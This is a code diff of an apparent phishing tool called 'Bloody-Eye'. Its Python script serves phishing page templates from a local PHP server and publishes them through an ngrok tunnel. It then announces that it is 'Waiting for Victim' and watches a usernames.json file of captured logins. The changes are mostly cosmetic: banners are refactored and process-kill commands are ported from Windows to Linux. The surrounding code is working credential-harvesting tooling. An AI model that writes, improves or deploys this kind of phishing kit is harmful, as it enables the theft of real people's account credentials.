@@ -529,32 +529,8 @@ exit();""")
     print(Fore.RED+" ["+Fore.WHITE+"02"+Fore.RED+"]"+Fore.YELLOW+" Ngorok.io")
     print("")
     def ngrokserver():
-       try:
-          with open("log","w") as phplog:
-             Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
-          os.system("clear")
-          print (Fore.BLUE+"""
-..............
-            ..,;:ccc,.
-          ......''';lxO.
-.....''''..........,:ld;
-           .';;;:::;,,.x,
-      ..'''.            0Xxoc:,.  ...
-  ....                ,ONkc;,;cokOdc',.
- .                   OMo           ':ddo.
-                    dMc               :OO;
-                    0M.                 .:o.
-                    ;Wd
-                     ;XO,
-                       ,d0Odlc;,..
-                           ..',;:cdOOd::,.
-                                    .:d;.':;.
-                                       'd,  .'
-                                         ;l   ..
-                                          .o
-                                            c
-                                            .'
-                                             .""")
+       bannner.banner2()
+       try:                   
           global token
           a = ngrok.connect(6060,"http",auth_token=token)
           print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" URL 1 :"+Fore.GREEN+str(a).replace('"','').replace("NgrokTunnel:","").replace("http","https").replace("-> https://localhost:6060",""))
@@ -567,29 +543,7 @@ exit();""")
     
     v = input(Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+Fore.CYAN+" Select a Port Forwarding Service : ")
     if v == "01":
-      os.system("clear")
-      print (Fore.BLUE+"""
-..............
-            ..,;:ccc,.
-          ......''';lxO.
-.....''''..........,:ld;
-           .';;;:::;,,.x,
-      ..'''.            0Xxoc:,.  ...
-  ....                ,ONkc;,;cokOdc',.
- .                   OMo           ':ddo.
-                    dMc               :OO;
-                    0M.                 .:o.
-                    ;Wd
-                     ;XO,
-                       ,d0Odlc;,..
-                           ..',;:cdOOd::,.
-                                    .:d;.':;.
-                                       'd,  .'
-                                         ;l   ..
-                                          .o
-                                            c
-                                            .'
-                                             .""")  
+      bannner.banner2()
       time.sleep(0.07)
       with open("log","w") as phplog:
          Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
@@ -654,10 +608,10 @@ exit();""")
         readip()
         info()
   except:
-    with open("exit","w") as kill:
-      Popen(("taskkill","/F","/IM","php*"),stderr=kill,stdout=kill)
-      os.system("clear")
-      sys.exit()
+     with open("logs/exit","w") as kill:
+        Popen(("killall","-KILL","php"),stdout=kill,stderr=kill)
+        print(" ")
+        sys.exit()
 
 
     
@@ -1007,7 +961,7 @@ exit();
     filedown.close()
     bannner.banner()
     print("")
-# Choosing a Service to Port Forwarding
+# Service to Port Forwarding
     time.sleep(0.07)
     print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Choose a Service to Port Forwarding")
     print("")
@@ -1016,55 +970,29 @@ exit();
     print(Fore.RED+" ["+Fore.WHITE+"02"+Fore.RED+"]"+Fore.YELLOW+" Ngorok.io")
     print("")
     def ngrokserver():
-       try:
-          with open("log","w") as phplog:
-             Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
-          os.system("clear")
-          print (Fore.BLUE+"""
-..............              
-            ..,;:ccc,.              
-          ......''';lxO.           
-.....''''..........,:ld;     
-           .';;;:::;,,.x,             
-      ..'''.            0Xxoc:,.  ...       
-  ....                ,ONkc;,;cokOdc',.     
- .                   OMo           ':ddo.  
-                    dMc               :OO;  
-                    0M.                 .:o.  
-                    ;Wd
-                     ;XO,
-                       ,d0Odlc;,..
-                           ..',;:cdOOd::,.
-                                    .:d;.':;.
-                                       'd,  .'
-                                         ;l   ..
-                                          .o
-                                            c
-                                            .'
-                                             .""")
+       bannner.banner2()
+       try:                   
           global token
           a = ngrok.connect(6060,"http",auth_token=token)
-          print("\n"+Fore.RED+" [~] URL 1 : "+Fore.BLUE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://").replace("-> https://localhost:6060",""))
-          print("\n"+Fore.RED+" [~] URL 2 : "+Fore.BLUE+str(a).replace('"','').replace("NgrokTunnel:","").replace("-> http://localhost:6060",""))
+          print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" URL 1 :"+Fore.GREEN+str(a).replace('"','').replace("NgrokTunnel:","").replace("http","https").replace("-> https://localhost:6060",""))
+          print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" URL 2 :"+Fore.GREEN+str(a).replace('"','').replace("NgrokTunnel:","").replace("-> http://localhost:6060",""))
        except:
-          with open("exit","w") as kill:
-             Popen(("taskkill","/F","/IM","php*"),stderr=kill,stdout=kill)
-          sys.exit()
+          with open("logs/exit","w") as kill:
+             Popen(("killall","-KILL","php"),stdout=kill,stderr=kill)
+             print(" ")
+             sys.exit()
     
     v = input(Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+Fore.CYAN+" Select a Port Forwarding Service : ")
     if v == "01":
-      print("")
+      bannner.banner2()
       time.sleep(0.07)
       with open("log","w") as phplog:
          Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
-      print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Php Server Has Started on Port 6060")
-      print("")
+      print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.GREEN+" Hosted at : "+Fore.BLUE+"localhost:6060")
       time.sleep(0.07)
-      print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Waiting For Victim ! ! !")
+      print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.YELLOW+" Waiting for Victim, "+Fore.BLUE+"Ctrl + C "+Fore.YELLOW+"to exit...")
     elif v == "02":
        ngrokserver()
-
-       
     def userin():
         global stat_file
         if not str(os.stat("../Bloody-Eye/templates/phishing/usernames.json").st_size) == stat_file:
@@ -1121,8 +1049,7 @@ exit();
         readip()
         info()
   except:
-    with open("exit","w") as kill:
-      Popen(("taskkill","/F","/IM","php*"),stderr=kill,stdout=kill)
-      os.system("clear")
-      sys.exit()
-
+     with open("logs/exit","w") as kill:
+        Popen(("killall","-KILL","php"),stdout=kill,stderr=kill)
+        print(" ")
+        sys.exit()
